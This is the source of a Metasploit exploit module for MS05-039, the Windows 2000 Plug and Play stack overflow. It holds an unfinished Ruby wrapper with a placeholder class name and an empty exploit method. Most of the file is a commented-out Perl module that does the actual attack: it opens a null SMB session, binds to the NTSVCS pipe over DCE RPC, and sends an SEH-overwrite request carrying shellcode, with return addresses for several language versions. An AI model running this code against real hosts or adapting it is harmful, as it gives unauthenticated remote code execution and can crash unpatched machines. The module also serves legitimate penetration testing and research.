require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft PnP MS05-039 Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the Windows Plug
				and Play service. This vulnerability can be exploited on
				Windows 2000 without a valid user account. Since the PnP
				service runs inside the service.exe process, a failed
				exploit attempt will cause the system to automatically
				reboot.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '18605'],
					[ 'CVE', '2005-1983'],
					[ 'BID', '14513'],
					[ 'MSB', 'MS05-039'],
					[ 'URL', 'http://www.hsc.fr/ressources/presentations/null_sessions/'],
					[ 'MIL', '87'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 9 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ms05_039_pnp;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::x86;

my $advanced =
  {
	'FragSize'  => [256, 'The application fragment size to use with DCE RPC'],
	'DirectSMB' => [0,    'Use the direct SMB protocol (445/tcp) instead of SMB over NetBIOS'],
  };

my $info =
  {
	'Name'  => 'Microsoft PnP MS05-039 Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 1,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 139],

		# Optional pipe name
		'SMBPIPE' => [1, 'DATA', 'Pipe name: browser, srvsvc, wkssvc', 'browser'],

		# SMB connection options
		'SMBUSER' => [0, 'DATA', 'The SMB username to connect with', ''],
		'SMBPASS' => [0, 'DATA', 'The password for specified SMB username', ''],
		'SMBDOM'  => [0, 'DATA', 'The domain for specified SMB username', ''],
	  },

	'Payload' =>
	  {
		'Space'     => 1000,
		'BadChars'  => '',
		'Keys'      => ['-ws2ord'], # no winsock in services.exe
		'MaxNops'   => 0,
		'MinNops'   => 0,
	  },

	'DefaultTarget'  => -1,

	'Targets'        =>
	  [
		[ 'Windows 2000 SP0-SP4',     0x767a38f6 ], # umpnpmgr.dll
		[ 'Windows 2000 SP4 French',  0x767438f6 ], # French target by ExaProbe <fmourron@exaprobe.com>
		[ 'Windows 2000 SP4 Spanish', 0x767738f6 ],		
		[ 'Windows 2000 SP0-SP4 German', 0x767338f6 ], # German target by Michael Thumann <mthumann@ernw.de>		
	  ],

	'Description'  => Pex::Text::Freeform(qq{
        This module exploits a stack overflow in the Windows
	Plug and Play service. This vulnerability can be exploited on Windows
	2000 without a valid user account. Since the PnP service runs inside
	the service.exe process, a failed exploit attempt will cause the system
	to automatically reboot.
}),

	'Refs'  =>
	  [
		['OSVDB', '18605'],
		['CVE', '2005-1983'],
		['BID', '14513'],
		['MSB', 'MS05-039'],
		['URL', 'http://www.hsc.fr/ressources/presentations/null_sessions/'],
		['MIL', '87'],
	  ],

	'Keys'  =>  ['pnp'],

	'DisclosureDate' => 'Aug 9 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $fragSize    = $self->GetVar('FragSize') || 256;

	if ( $self->ProbePNP($target_host, $target_port, $fragSize, 'A' )) {
		$self->PrintLine("[*] This system appears to be vulnerable");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Unknown');
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $fragSize    = $self->GetVar('FragSize') || 256;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $return  = pack('V', $target->[1]);
	my $request =

	  # Get to seh next ptr
	  RandomData(0x38) .

	  # SEH Next / jmp to shellcode
	  Pex::x86::JmpShort('$+32') . RandomData(2) .

	  # SEH Handler
	  $return .
	  RandomData(20) .

	  # ResourceName - cause access violation on RtlInitUnicodeString
	  RandomData(3) . "\xff" .

	  # shellcode!
	  $shellcode;

	$self->ProbePNP($target_host, $target_port, $fragSize, $request);
	return;
}

sub ProbePNP {
	my $self = shift;
	my $target_host = shift;
	my $target_port = shift;
	my $fragSize    = shift;
	my $request     = shift;
	my $target_name = '*SMBSERVER';

	my $cs_des =

	  # CS_DES
	  # CSD_SignatureLength, CSD_LegacyDataOffset, CSD_LegacyDataSize, CSD_Flags
	  # GUID and then the dataz
	  pack('VVVV', 0, 0, length($request), 0) . RandomData(16) . $request;

# PNP_QueryResConfList(L"a\\b\\c", 0xffff, (char *)pClassResource, 1000, foo, 4, 0);
	my $stub =

	  # ResourceName:
	  # our device name, good enough to pass IsLegalDeviceId and IsRootDeviceID
	  NdrUnicodeConformantVaryingString('a\\b\\c') .

	  # ResourceID:
	  # 0xffff - ResType_ClassSpecific
	  NdrLong(0xffff) .

	  # ResourceData
	  # our CS_DES structure
	  NdrUniConformantArray($cs_des) .

	  # ResourceLen (I'm guessing the server double checks this?)
	  NdrLong(length($cs_des)) .

	  # OutputLen
	  # Need to be atleast 4...
	  NdrLong(4) .

	  # Flags
	  # unused? something said it must be zero?...
	  NdrLong(0);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return(0);
	}

	my $x = Pex::SMB->new({ 'Socket' => $s });

	if ($target_port != 445 && ! $self->GetVar('DirectSMB')) {
		$x->SMBSessionRequest($target_name);
		if ($x->Error) {
			$self->PrintLine("[*] Session request failed for $target_name");
			return;
		}
	}

	$x->SMBNegotiate();
	$x->SMBSessionSetup (
		$self->GetVar('SMBUSER'),
		$self->GetVar('SMBPASS'),
		$self->GetVar('SMBDOM')
	  );

	if ($x->Error) {
		$self->PrintLine("[*] Failed to establish a null session");
		return;
	}

	$target_name = $x->DefaultNBName;

	# Left in OS detection, might be useful for exploitation..
	if ($x->PeerNativeOS eq 'Windows 5.0') {
		$self->PrintLine("[*] Detected a Windows 2000 target ($target_name)");
	} else {
		$self->PrintLine("[*] No target available for ".$x->PeerNativeOS." ($target_name)");
		return;
	}

	$x->SMBTConnect("\\\\".$target_name."\\IPC\$");
	if ($x->Error) {
		$self->PrintLine("[*] Failed to connect to the IPC share");
		return;
	}

	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti(
		Pex::DCERPC::UUID_to_Bin('8d9f4e40-a03d-11ce-8f69-08003e30051b'),
		'1.0'
	  );

	# PNP_QueryResConfList what what
	my (@DCE) = Pex::DCERPC::Request(0x36, $stub, $fragSize, $ctx);

	$x->SMBCreate('\\'. $self->GetVar('SMBPIPE'));
	if ($x->Error) {
		$self->PrintLine("[*] Failed to create pipe to NTSVCS");
		return;
	}

	$x->SMBTransNP($x->LastFileID, $bind);
	if ($x->Error) {
		$self->PrintLine("[*] Failed to bind to NTSVCS over DCE RPC: ".$x->Error);
		return;
	}

	if (scalar(@DCE) > 1) {
		my $offset = 0;
		$self->PrintLine("[*] Sending ".(scalar(@DCE)-1)." DCE request fragments...");

		while (scalar(@DCE != 1)) {
			my $chunk = shift(@DCE);
			$x->SMBWrite($x->LastFileID, $offset, $chunk);
			$offset += length($chunk);
		}
	}

	$self->PrintLine("[*] Sending the final DCE fragment");
	my $res = $x->SMBTransNP($x->LastFileID, $DCE[0]);
	if ($res && $res->Get('data_bytes')) {
		my $dce = Pex::DCERPC::DecodeResponse($res->Get('data_bytes'));
		if ($dce->{'StubData'} eq "\x04\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00") {
			return 1;
		}
	}

	return;
}

sub RandomData {
	my $length = shift;

	my $data = '';

	while($length--) {
		$data .= chr(int(rand(256)));
	}

	return($data);
}

sub Unicode {
	my $str = shift;
	my $unicode = '';

	foreach my $char (split('', $str)) {
		$unicode .= $char . "\x00";
	}

	return($unicode);
}

sub DwordAlign {
	my $length = shift;

	return RandomData((4 - ($length & 3)) & 3);
}

sub NdrLong {
	my $val = shift;
	return pack('V', $val);
}

sub NdrUnicodeConformantVaryingString {
	my $str = shift;

	# ndr conformant varying string
	# count includes null terminator
	# maximum count - offset - actual count
	my $data = pack('VVV', length($str)+1, 0, length($str)+1);

	$data .= Unicode($str . "\x00");

	$data .= DwordAlign(length($data));

	return($data);
}

sub NdrUniConformantArray {
	my $bytes = shift;
	my $len   = @_ ? shift : length($bytes);

	# ndr uni-demensional conformant array
	# actual count
	my $data = pack('V', $len);

	$data .= $bytes;

	$data .= DwordAlign(length($data));

	return($data);
}

1;

=end


end
end	
